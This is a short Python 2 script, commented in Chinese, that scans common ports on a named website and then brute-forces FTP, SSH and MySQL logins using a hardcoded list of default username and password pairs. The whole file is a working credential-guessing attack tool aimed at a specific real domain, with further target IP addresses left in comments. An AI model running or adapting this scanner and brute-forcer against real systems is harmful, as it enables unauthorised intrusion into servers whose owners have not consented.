#coding=utf-8
import socket

import ftplib

ftplist = '''
anonymous:me@your.com
administrator:password
admin:12345
admin:123456
root:secret
root:root123
root:123
root:1234567890
root:123456789
guest:guest
root:toor
negocat:t111111
root:tT123456
root:root
root:linux111
root:Linux111
'''
#字典暴力破解ftp用户名密码
def anonLogin(hostname, username='anonymous', password='me@your.com'):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login(username, password)
		print('[*] %s:%s:%s FTP AnonymousLogon Succeeded!'%(str(hostname), username, password))
		ftp.quit()
		return True
	except Exception as e:
		# print('[-] %s:%s:%s FTP AnonymousLogon Failed!'%(str(hostname), username, password))
		return False
	


#字典暴力破解ssh用户名密码
def sshconnect(host, user, password):
	import paramiko
	try:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host, username = user, password = password)
		print('[+] SSH Password Found: %s:%s:%s' % (host, user, password))
	except Exception as e:
		pass


#字典暴力破解mysql用户名密码
def mysqlconnect(host, user, password):
	import MySQLdb
	try:
		MySQLdb.connect(host=host,user=user,passwd=password)
		print('[+] MYSQL Password Found: %s:%s:%s' % (host, user, password))
	except Exception as e:
		pass

#扫描端口
def findport(dictionary=''):
	socket.setdefaulttimeout(2)

	ports = [21, 22, 53, 445, 80, 443, 3389, 8080, 3306]

	hosts = ['www.taobiye.com']#'121.41.116.104', '127.0.0.1', 

	for host in hosts:
		for port in ports:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				# print "[+] Attempting to connect to " + host + ":" + str(port)
				i = s.connect_ex((host, port))
				# s.send('absdkfbsdafblabldsfdbfhasdflbf /n')
				# banner = s.recv(1024)
				if i == 0:
					print "[+] " + host + ":" + str(port) + " open "# + banner
				s.close()
				#特定端口进行特定破解
				if dictionary != '':
					dictionary = dictionary.replace(' ', '')
					for i in dictionary.split():
						if port == 21:
							anonLogin(host, i.split(':')[0], i.split(':')[1])
						elif port == 22:
							sshconnect(host, i.split(':')[0], i.split(':')[1])
						elif port == 3306:
							mysqlconnect(host, i.split(':')[0], i.split(':')[1])

			except Exception, e: 
				pass


# host = '139.196.22.120'
# anonLogin(host)

findport(ftplist)